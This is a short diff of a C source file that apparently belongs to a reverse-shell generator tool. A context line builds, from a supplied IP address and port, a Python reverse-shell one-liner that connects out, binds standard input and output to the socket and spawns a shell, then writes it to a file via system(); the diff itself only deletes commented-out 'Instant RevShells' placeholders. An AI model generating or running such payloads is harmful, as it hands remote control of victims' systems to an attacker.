@@ -487,17 +487,5 @@ void GetPython_Full_Cred()
 	sprintf(cmd , "echo \"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"%s\",%s));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'\" > python_revshell.txt \n" , ip_addr , ip_port );
 	system(cmd);
 }
-// **************************************************************************************** \\ 
 
 
-
-
-
-// Instant RevShells **************************************** Instant RevShells \\ 
-
-// void functions_for_instant_revshells()
-// {
-
-// }
-
-// ****************************************************************************  \\ 
